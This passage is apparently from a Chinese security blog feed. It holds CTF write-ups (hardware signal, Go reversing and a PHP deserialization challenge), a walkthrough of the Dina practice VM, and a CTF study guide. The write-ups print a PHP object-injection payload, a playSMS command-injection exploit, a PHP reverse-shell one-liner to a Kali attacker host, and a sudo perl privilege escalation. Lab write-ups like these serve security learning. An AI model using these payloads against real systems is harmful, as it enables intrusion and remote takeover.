‘的ascill为0x20)处写入数据</p><p>然后，在信号结束的地方，有一个 <code>Setup Write to [&#39;160&#39;] +ACK \n \t+ACK </code> ,表明是把0x09、0x10位置的数据修改为ac，数据下标是从0开始的，一开始不小心疏忽了，一直错误。  </p><p>至于我是怎么理解的，<a href="https://tieba.baidu.com/p/4244941563?red_tag=1385763725">请看这个连接</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;c<span class="number">46</span>dac<span class="number">10</span>-e<span class="number">9</span>b<span class="number">5</span>-<span class="number">4</span>d<span class="number">90</span>-a<span class="number">883</span>-<span class="number">41</span>cf<span class="number">163</span>bdf<span class="number">4</span>e&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-usbasp"><a href="#0x03-usbasp" class="headerlink" title="0x03 * usbasp"></a>0x03 * usbasp</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/usbasp.png"></p><p>又是这个题目，还是这个软件，一样的打开方式，分析数据，发现采用的又变回SPI协议了，这个题目说起来。。。。很简单的，但是没有想到点上。这个信号不同的就是他的数据输入有点特别，所以我们在分析的时候需要做一点小小的设置。</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/usbasp-a.png" alt="usbasp-a"></p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/usbasp-c.png" alt="usbasp-c"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">85</span>b<span class="number">084</span>c<span class="number">6</span>-<span class="number">42</span>e<span class="number">6</span>-<span class="number">495</span>c-<span class="number">87</span>b<span class="number">4</span>-<span class="number">46</span>dfb<span class="number">1</span>df<span class="number">58</span>a<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-easyGo"><a href="#0x04-easyGo" class="headerlink" title="0x04 easyGo"></a>0x04 easyGo</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/easyGo.png"></p><p>文件地址：<a href="https://github.com/ch3cke/challenges/raw/master/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B/easyGo_ec2819a048a8e908a90c3f5b9f8cd985.zip">点击下载</a></p><p>首先用IDA查看文件内容，发现是go语言编写的，ida无法识别函数名，有点难受。去找找ida逆向语言的插件–<a href="https://github.com/ch3cke/challenges/raw/master/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B/IDAGolangHelper-master.zip">IDAGolangHelper</a>。加载后，可以识别大部分函数名字。</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/easyGo-a.png" alt="easyGO"></p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/easyGo-b.png" alt="easyGo-b"></p><p>找到主函数：mian_main,f5一下。可以看到程序逻辑：</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/easyGo-c.png" alt="easyGo-c"></p><p>注意到有个比较，以前学过go语言,在这个题目里，”_”可以识别成“.” ,大部分都是包的调用，很好理解 。发现比较的两个值都在栈里，所以简单了，只要用pwndbg调试,在比较前下个断点，在栈面可以找到flag。</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/easyGo-d.png" alt="easyGO-d"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">92094</span>daf-<span class="number">33</span>c<span class="number">9</span>-<span class="number">431</span>e-a<span class="number">85</span>a-<span class="number">8</span>bfbd<span class="number">5</span>df<span class="number">98</span>ad&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-JustSoso"><a href="#0x05-JustSoso" class="headerlink" title="0x05 JustSoso"></a>0x05 JustSoso</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/Justsoso.png" alt="Justsoso"></p><p>考察知识点：<a href="https://www.freebuf.com/column/148886.html">php伪协议</a>、<a href="https://www.freebuf.com/articles/web/167721.html">反序列化</a></p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/Justsoso-a.png" alt="jsut"></p><p>打开题目可以看到有一个file参数，可以查看源码发现还有一个hint.php文件。先尝试用伪协议读取源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;payload&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Missing parameter&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hack attacked!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>))&#123;  </span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    parse_str(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span> = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Missing parameters&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hint.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Waking up\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="variable">$handle</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="literal">true</span>);</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到unserialize和魔术方法就会想要利用反序列化漏洞</p><p>想到利用反序列化的漏洞，绕过__wakeup函数</p><p>由于handle是私有变量，因此payload应该是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///</span></span><br><span class="line">index.php?file=hint.php&amp;payload=O:<span class="number">6</span>:<span class="string">&quot;Handle&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Handle%00handle&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;N;s:<span class="number">10</span>:<span class="string">&quot;token_flag&quot;</span>;R:<span class="number">4</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>利用php中的”&amp;”,，绕过随机数</p><p>利用”///“,<a href="http://www.am0s.com/functions/406.html">绕过parse_url</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">38</span>b<span class="number">3</span>ff<span class="number">3</span>b-<span class="number">3</span>ac<span class="number">0</span>-<span class="number">4</span>a<span class="number">8</span>e-a<span class="number">344</span>-b<span class="number">75</span>b<span class="number">0</span>f<span class="number">23</span>bb<span class="number">68</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Author: &lt;a href=&quot;https://ch3cke.github.io/&quot;&gt;ch3cke&lt;/a&gt;&lt;/p&gt;
&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;0x00-签到题&quot;&gt;&lt;a href=&quot;#0x00-签到题&quot; class=&quot;headerlink&quot; title=&quot;0x00 签到题&quot;&gt;&lt;/a&gt;0x00 签到题&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/%E7%AD%BE%E5%88%B0%E9%A2%98%E7%9B%AE.png&quot; alt=&quot;签到&quot;&gt;&lt;/p&gt;
&lt;p&gt;文件连接：&lt;a href=&quot;https://github.com/ch3cke/challenges/raw/master/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B/qiandao_32ac2a19cef66c300e29fafac57b9e1a%20(1).zip&quot;&gt;点击下载&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="总结" scheme="http://ch3cke.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="http://ch3cke.github.io/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>Dina渗透</title>
    <link href="http://ch3cke.github.io/2018/12/08/Dina%E6%B8%97%E9%80%8F/"/>
    <id>http://ch3cke.github.io/2018/12/08/Dina%E6%B8%97%E9%80%8F/</id>
    <published>2018-12-08T08:35:17.000Z</published>
    <updated>2021-06-10T14:40:16.624Z</updated>
    
    <content type="html"><![CDATA[<p>Dian是一台渗透测试用的虚拟环境，只是用于娱乐的主机，不过玩的还是挺开心的。写点笔记作为参考。使用的网络环境为NAT模式。</p><span id="more"></span><h2 id="发现目标主机"><a href="#发现目标主机" class="headerlink" title="发现目标主机"></a>发现目标主机</h2><p>利用扫描工具nmap扫描目标网段，寻找存活的目标主机。我的NAT模式网段在192.168.43.1这个网段上，可以用命令：</p><p><code>nmap 192.168.43.0/24</code></p><p>扫描目标端内所有的存活主机</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181128233231.png"></p><p>发现目标主机：<code>192.168.43.130</code></p><p>开放端口：<code>80</code></p><p>访问目标服务器<img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181203152020.png"></p><p>查看源代码什么的，发现没有什么入口什么的。可能需要寻找其他的入侵点。</p><h2 id="发现登录入口"><a href="#发现登录入口" class="headerlink" title="发现登录入口"></a>发现登录入口</h2><p>没事就看看robots.txt，没准就有惊喜。查看robots.txt。真的有惊喜！！！</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/ange1</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/angel1</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/nothing</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/tmp</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/uploads</span><br></pre></td></tr></table></figure><p>这几个几个页面依次访问一下，除了<code>\nothing</code>这个页面，其他的都一个个文件夹，一度让我以为是文件上传，卡了很久。。。。。。头疼。后来想了一下，会不会还有什么页面没有出现，用<code>dirb</code>–kali下的一个扫描的软件–默认字典就够了。</p><p>发现页面：<code>http://192.168.43.130/secure/</code>，访问得到一个压缩包，打开需要密码，结合前面noting页面发现的几个密码，一个个尝试发现工作量也不是很大，或者使用zip2John爆破，可以发现密码为<code>freedom</code></p><p>nothing页面发现的密码：</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142134.png"></p><p>打开压缩包，提取文件，是一个后缀为MP3的文件，但是。。。我并不想听音乐，所以，先用strings命令查看一下有没有特殊的东西，有线索。。</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142626.png"></p><p>ok,发现新的页面，继续访问，是个登录页面，从压缩包中获取的文件得知，只有用户名，密码还是得一个个试。。。。测试过后得到：</p><p><code>username：touhid</code></p><p><code>password：diana</code></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录，发现是一个playSMS的网站，上网找一下有没有漏洞，早exploit-DB上面发现一个远程命令执行，发现可以使用，具体漏洞：<a href="https://www.exploit-db.com/exploits/42044%E3%80%82%E6%9F%A5%E7%9C%8B%E5%8F%AF%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%82%B9%E5%9C%A8%E4%BA%8E%E7%94%B5%E8%AF%9D%E7%B0%BF%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E7%9A%84%E5%AF%BC%E5%85%A5%EF%BC%8C%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%9C%A8%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E%E4%B8%AD%E5%BE%88%E6%B8%85%E6%A5%9A%E3%80%82%E7%9B%B4%E6%8E%A5%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E3%80%82">https://www.exploit-db.com/exploits/42044。查看可知漏洞的点在于电话簿用户信息的导入，具体利用方式在漏洞说明中很清楚。直接可以使用。</a></p><p>漏洞利用文件：</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206143717.png"></p><p>上传，利用burpsuite抓包，由于执行的命令在USER_AGENT，所以修改http请求的USER_AGENT的内容为我们要执行的命令就可以了。</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144238.png"></p><p>结果：</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144245.png"></p><p>下一步就是反弹shell了，我的kali攻击机的IP地址为：192.168.43.129，所以把shell反弹到这就行了，监听kali 的8008端口：</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144851.png"></p><p>利用命令：</p><p><code>php -r &#39;$sock=fsockopen(&quot;192.168.43.129&quot;,8008);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p>getshell:</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145215.png"></p><p>成功进入主机！！！</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e <span class="symbol">&#x27;exec</span> <span class="string">&quot;cat /root/flag.txt&quot;</span>;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145522.png"></p><p>hack it！！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Dian是一台渗透测试用的虚拟环境，只是用于娱乐的主机，不过玩的还是挺开心的。写点笔记作为参考。使用的网络环境为NAT模式。&lt;/p&gt;
&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;发现目标主机&quot;&gt;&lt;a href=&quot;#发现目标主机&quot; class=&quot;headerlink&quot; title=&quot;发现目标主机&quot;&gt;&lt;/a&gt;发现目标主机&lt;/h2&gt;&lt;p&gt;利用扫描工具nmap扫描目标网段，寻找存活的目标主机。我的NAT模式网段在192.168.43.1这个网段上，可以用命令：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap 192.168.43.0/24&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="-总结" scheme="http://ch3cke.github.io/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>CTF学习指南</title>
    <link href="http://ch3cke.github.io/2018/12/08/CTF%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/"/>
    <id>http://ch3cke.github.io/2018/12/08/CTF%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/</id>
    <published>2018-12-08T07:23:49.000Z</published>
    <updated>2021-06-10T14:40:17.481Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>PWN,Reverse：偏重对汇编，逆向的理解，逆向更多要求对于各种代码的了解，会常见开发，注重算法的理解，数据结构和算法一定要学好；PWN要求对于计算机系统的了解，对于基础的数据结构-栈堆-以及Linux/widows下的程序调用比较熟悉。</p><p>crypto：偏重对数学，算法的深入学习，同时也需要对常见密码有所了解-AES/DES等；</p><p>Web：需要对各种web漏洞了解，明白其形成原因和利用方式；了解计算机网络、网站搭建、会用常见的网站框架，同时需要大量的练习；</p><p>Misc：则更为复杂，所有与计算机安全挑战有关的都算在其中，所学很杂，积累和刷题很重要，常见有流量分析/隐写等；</p><p>Mobile:安卓逆向，要去了解安卓的基本架构；</p><h2 id="常规做法"><a href="#常规做法" class="headerlink" title="常规做法"></a>常规做法</h2><p>　　A方向：PWN+Reverse+crypto,随机搭配；</p><p>　　B方向：Web+Misc组合；</p><h2 id="都要学的内容："><a href="#都要学的内容：" class="headerlink" title="都要学的内容："></a>都要学的内容：</h2><ul><li>Linux基础</li><li>计算机组成原理</li><li>操作系统原理</li><li>网络协议分析</li><li>数据结构</li><li>算法</li></ul><h2 id="A方向"><a href="#A方向" class="headerlink" title="A方向"></a>A方向</h2><p>　　　　IDA工具使用（f5插件），逆向工程，密码学，缓冲区溢出等</p><p>​         书籍推荐：</p><ul><li><p>《加密与解密（第四版）》；</p></li><li><p>《IDA Pro权威指南》；</p></li><li><p>《逆向工程权威指南》（字典工具书）；</p></li><li><p>《自己动手写操作系统》；</p></li><li><p>《算法导论》</p></li><li><p>《汇编语言》</p></li><li><p>《黑客攻防宝典，系统实战篇》；</p></li><li><p>《程序员的自我修养–链接、装载与库》</p><p>网站推荐： </p><p><a href="http://www.pediy.com/">www.pediy.com</a></p><p><a href="http://www.52pojie.cn/">www.52pojie.cn</a></p><p><a href="http://www.pwnable.kr/">www.pwnable.kr</a></p><p><a href="http://www.pwnable.tw/">www.pwnable.tw</a></p></li></ul><h2 id="B方向"><a href="#B方向" class="headerlink" title="B方向"></a>B方向</h2><p>　　　　网络安全，内网渗透，数据库安全。</p><p>　　　　书籍推荐：</p><ul><li><p>《Web应用安全权威指南》</p></li><li><p>《web前端黑客技术揭秘》</p></li><li><p>《黑客秘籍-渗透测试实用指南》</p></li><li><p>《黑客攻防技术宝典Web实战篇》</p></li><li><p>《代码审计：企业级Web代码安全架构》</p></li><li><p>《SQL注入攻击与防御》</p><p>网站推荐：</p><p><a href="http://www.dvwa.co.uk/">dvwa本地靶场</a>（自己在本地搭建）</p><p><a href="https://github.com/Audi-1/sqli-labs">SQLilab本地靶场</a>（自己在本地搭建）</p><p><a href="https://pan.baidu.com/s/1eRIB3Se">webug</a>（本地搭建）</p><p><a href="http://hackinglab.cn/">http://hackinglab.cn/</a></p><p><a href="http://www.gameofhacks.com/">http://www.gameofhacks.com/</a></p><p><a href="http://1111.segmentfault.com/">http://1111.segmentfault.com/</a> 光棍节程序员闯关秀</p><p><a href="http://monyer.com/game/game1/">http://monyer.com/game/game1/</a>梦之光芒的小游戏</p><p><a href="http://www.fj543.com/hack/">http://www.fj543.com/hack/</a> 黑客丛林之旅</p><p><a href="http://hackgame.blackbap.org/">http://hackgame.blackbap.org/</a> 习科黑客游戏</p><p><a href="http://www.helloisa.com/test/">http://www.helloisa.com/test/</a> ISA闯关游戏</p><p><a href="http://hkyx.myhack58.com/">http://hkyx.myhack58.com/</a> 红客闯关游戏</p><p><a href="http://hackit.sinaapp.com/">http://hackit.sinaapp.com/</a> hackit游戏</p></li></ul><h2 id="CTF综合平台"><a href="#CTF综合平台" class="headerlink" title="CTF综合平台"></a>CTF综合平台</h2><p>学校自己的系统（10.222.2.235/10.222.2.236）</p><p><a href="http://www.ichunqiu.com/">http://www.ichunqiu.com/</a>  i春秋</p><p><a href="http://www.shiyanbar.com/">http://www.shiyanbar.com</a> 实验吧</p><p><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a> bugku平台</p><p><a href="http://oj.xctf.org.cn/">http://oj.xctf.org.cn/</a> XCTF_OJ练习平台 （自己去找吧）</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>　　CTF比赛一般都是使用网络完全常用工具，比如burp、IDA等，但是会与很多大家不常见的工具：</p><p>　　　　<a href="https://hithub.com/truongkma/ctf-tools">https://hithub.com/truongkma/ctf-tools</a></p><p>　　　　<a href="https://tool.bugku.com/">https://tool.bugku.com/</a></p><h2 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h2><ul><li>​        <a href="https://ctftime.org/%E5%9B%BD%E9%99%85%E6%AF%94%E8%B5%9B">https://ctftime.org/国际比赛</a></li><li>​        <a href="http://www.xctf.org.cn/%E5%9B%BD%E5%86%85%E6%AF%94%E8%B5%9B">http://www.xctf.org.cn/国内比赛</a></li><li>​        <a href="http://www.ichunqiu.com/">http://www.ichunqiu.com/</a>  i春秋（赛宁）</li></ul><p>【注】：</p><p>1、writeup指CTF比赛结题思路</p><h1 id="信心比黄金更重要"><a href="#信心比黄金更重要" class="headerlink" title="信心比黄金更重要"></a><strong>信心比黄金更重要</strong></h1><p>禁止转载！！！</p>]]></content>
    
    
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;PWN,Reverse：偏重对汇编，逆向的理解，逆向更多要求对于各种代码的了解，会常见开发，注重算法的理解，数据结构和算法一定要学好；PWN要求对于计算机系统的了解，对于基础的数据结构-栈堆-以及Linux/widows下的程序调用比较熟悉。&lt;/p&gt;
&lt;p&gt;crypto：偏重对数学，算法的深入学习，同时也需要对常见密码有所了解-AES/DES等；&lt;/p&gt;
